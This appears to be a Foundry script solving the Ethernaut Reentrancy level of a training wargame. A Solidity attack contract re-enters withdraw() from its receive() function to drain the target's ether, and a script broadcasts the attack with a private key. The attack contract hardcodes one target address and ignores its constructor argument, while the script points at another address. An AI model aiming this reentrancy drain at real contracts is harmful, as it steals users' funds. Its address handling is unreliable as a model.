// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/reentrancy.sol";

contract ReentrancyAttack {
    Reentrance public reentrance =
        Reentrance(payable(0x899e434d4Db2Ed330cbCc366b52a491C11768A7c));

    constructor(address payable _reentrance) payable {}

    function attack() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        uint256 amount = reentrance.balanceOf(address(this));
        uint256 balance = address(reentrance).balance;
        while (balance > 0) {
            reentrance.withdraw(amount);
            balance -= amount;
            console.log("balance left:", address(reentrance).balance);
        }
    }
}

contract ReentrancyAttackScript is Script {
    Reentrance public reentrance =
        Reentrance(payable(0x08b223478D117C678d4e9d08A27aa67c4683a75e));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReentrancyAttack attack = new ReentrancyAttack{value: 0.001 ether}(
            payable(address(reentrance))
        );
        attack.attack();
        vm.stopBroadcast();
    }
}
